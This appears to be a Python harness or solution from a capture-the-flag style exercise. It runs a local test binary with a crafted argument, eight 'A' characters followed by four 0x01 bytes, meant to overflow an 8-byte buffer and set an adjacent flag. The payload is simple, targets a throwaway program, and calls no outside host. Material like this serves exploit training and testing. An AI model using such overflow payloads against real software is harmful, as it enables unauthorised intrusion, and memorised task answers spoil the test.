  def execute_program(timeout: int) -> tuple[str, int]:
      import subprocess
      import signal
      
      try:
          # Create a payload to exploit the buffer overflow vulnerability
          # Fill the buffer with 8 'A's and then add the value 1 in a format without null bytes
          # Using 0x01010101 (16843009) which is represented as "\x01\x01\x01\x01" in little-endian
          buffer_content = "A" * 8  # Fill the 8-byte buffer
          flag_overwrite = "\x01\x01\x01\x01"  # Value that should make flag non-zero
          payload = buffer_content + flag_overwrite
          
          # Execute the program with our crafted payload as the argument
          # Note: We're fixing the execution approach to properly separate executable and arguments
          result = subprocess.run(
              ["./temp_executable", payload],  # Pass payload as a separate argument
              capture_output=True,
              encoding="utf-8",
              errors="replace",
              shell=False,  # Important: Don't use shell=True to avoid issues with special characters
              timeout=timeout,
          )
          
          # Return stderr and the return code
          return result.stderr, result.returncode
      except subprocess.TimeoutExpired as e:
          # Timeout occurred, also ensure to return stderr captured before timeout and return code -signal.SIGKILL
          stderr_text = e.stderr if e.stderr is not None else ""
          return stderr_text, -signal.SIGKILL
      except Exception as e:
          # ensure to raise the error if run failed
          raise e
